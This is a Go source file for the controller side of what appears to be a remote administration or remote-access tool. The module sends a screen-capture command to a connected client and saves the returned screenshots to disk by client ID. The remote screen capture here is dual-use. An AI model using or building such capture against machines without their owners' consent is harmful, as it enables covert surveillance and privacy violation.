package screen

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
	"time"
	"unsafe"

	"server/internal/mod"
	net "server/internal/network"
	"server/internal/utility"
)

const (
	// Screen means the packet is related to screen capture.
	Screen net.PacketType = 4
)

type screen struct {
	currClient net.Client

	utility.LogQue
}

// New creates a new screen capture module.
func New(logger utility.LogQue) mod.Module {
	utility.Assert(logger != nil, "Null logger.")

	return &screen{
		LogQue: logger,
	}
}

func (screen *screen) Exec(cmd string, args []string) error {
	utility.Assert(cmd == "sc", "Invalid command.")

	if screen.currClient == nil {
		return fmt.Errorf("The current client is null")
	}

	packet := net.Packet{}
	packet.Type = Screen
	return screen.currClient.SendPacket(&packet)
}

func (screen *screen) Cmds() []string {
	return []string{
		"sc",
	}
}

// BUG: The color of the pixels in the .png file does not mismatch the original screen.
func (screen *screen) Respond(client net.Client, packet *net.Packet) error {
	utility.Assert(packet.Type == Screen, "Invalid packet type.")

	dirName, err := screen.makeDir()
	if err != nil {
		return err
	}

	var buffer [unsafe.Sizeof(int32(0)) * 2]byte
	if _, err := packet.Read(buffer[:]); err != nil {
		return err
	}

	var width, height int32 = 0, 0
	reader := bytes.NewReader(buffer[:])
	binary.Read(reader, binary.LittleEndian, &width)
	binary.Read(reader, binary.LittleEndian, &height)

	img := image.NewRGBA(
		image.Rectangle{image.Point{0, 0},
			image.Point{int(width), int(height)}})

	reader = bytes.NewReader(packet.Data)
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {

			var red, green, blue, unused uint8 = 0, 0, 0, 0
			binary.Read(reader, binary.LittleEndian, &red)
			binary.Read(reader, binary.LittleEndian, &green)
			binary.Read(reader, binary.LittleEndian, &blue)
			binary.Read(reader, binary.LittleEndian, &unused)

			img.Set(x, y, color.RGBA{red, green, blue, 0xFF})
		}
	}

	fileName := fmt.Sprintf("%v/%v-%v.png",
		dirName, client.ID(), time.Now().Unix())
	file, err := os.Create(fileName)
	if err != nil {
		return err
	}

	err = png.Encode(file, img)
	if err != nil {
		return err
	}

	msg := fmt.Sprintf(
		"A screenshot from the client [%v] has been saved as %v.png.",
		client.ID(), fileName)
	screen.Store(msg)
	return nil
}

func (screen *screen) Packets() []net.PacketType {
	return []net.PacketType{
		Screen,
	}
}

func (screen *screen) ID() mod.ModuleID {
	return 2
}

func (screen *screen) Name() string {
	return "SCREEN"
}

func (screen *screen) SetClient(client net.Client) {
	screen.currClient = client
}

func (screen *screen) Close() error {
	return nil
}

func (screen *screen) makeDir() (string, error) {
	dirName := time.Now().Format("2006-01")
	_, err := os.Stat(dirName)
	if err != nil && os.IsNotExist(err) {
		return dirName, os.Mkdir(dirName, os.ModePerm)
	}

	return dirName, nil
}
